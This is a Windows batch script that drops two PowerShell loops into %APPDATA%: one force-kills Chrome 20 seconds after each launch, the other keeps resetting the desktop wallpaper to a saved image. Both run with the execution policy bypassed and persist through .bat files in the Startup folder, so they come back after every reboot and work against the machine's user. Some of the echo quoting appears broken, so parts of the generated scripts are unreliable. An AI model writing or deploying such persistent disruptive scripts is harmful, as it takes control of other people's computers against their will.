@echo off
setlocal enabledelayedexpansion

:: Deploy watchdog2.ps1
set "watchdogPath=%APPDATA%\watchdog2.ps1"
(
    echo ^# watchdog2.ps1 - Monitor and kill chrome.exe after 20 seconds
    echo $scriptPath = $MyInvocation.MyCommand.Path
    echo $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\watchdog2.bat"
    echo if (!(Test-Path $startupPath)) {
    echo     "@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"^"$scriptPath^"`"" ^| Out-File -Encoding ASCII $startupPath
    echo }
    echo while ($true) {
    echo     $chrome = Get-Process -Name "chrome" -ErrorAction SilentlyContinue
    echo     if ($chrome) {
    echo         Write-Host "Chrome detected. Waiting 20 seconds before terminating..."
    echo         Start-Sleep -Seconds 20
    echo         try {
    echo             Get-Process -Name "chrome" -ErrorAction SilentlyContinue ^| Stop-Process -Force
    echo             Write-Host "Chrome terminated."
    echo         } catch {
    echo             Write-Host "Failed to terminate Chrome: $_"
    echo         }
    echo     }
    echo     Start-Sleep -Seconds 5
    echo }
) > "%watchdogPath%"

:: Optionally: launch watchdog2 immediately
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%watchdogPath%" &

:: Deploy or confirm other wallpaper monitor scripts
if exist "%APPDATA%\monitorWallpaper.ps1" (
    echo Wallpaper monitor script already exists.
) else (
    echo Creating default monitorWallpaper.ps1...
    set "psScriptPath=%APPDATA%\monitorWallpaper.ps1"
    (
        echo $savedPath = Get-Content "%APPDATA%\savedWallpaperPath.txt"
        echo $checkInterval = 5
        echo function Set-Wallpaper($path) {
        echo     Add-Type @"
        echo using System;
        echo using System.Runtime.InteropServices;
        echo public class NativeMethods {
        echo     [DllImport("user32.dll", SetLastError = true)]
        echo     public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        echo }
"@
        echo     [NativeMethods]::SystemParametersInfo(20, 0, $path, 3) ^| Out-Null
        echo }
        echo while ($true) {
        echo     $currentWallpaper = (Get-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper).Wallpaper
        echo     if ($currentWallpaper -ne $savedPath) {
        echo         Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value $savedPath
        echo         Set-Wallpaper $savedPath
        echo         Write-Host 'Wallpaper reset to saved image'
        echo     }
        echo     Start-Sleep -Seconds $checkInterval
        echo }
    ) > "%psScriptPath%"
)

:: Ensure wallpaper monitor runs at startup
set "startupMonitor=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runMonitor.bat"
if not exist "%startupMonitor%" (
    (
        echo @echo off
        echo powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%psScriptPath%"
    ) > "%startupMonitor%"
)

echo.
echo Watchdog2 and Wallpaper monitor deployed.
echo Watchdog2 will monitor and close Chrome after 20 seconds.
echo Wallpaper monitor ensures persistent wallpaper.
echo.
pause
exit /b


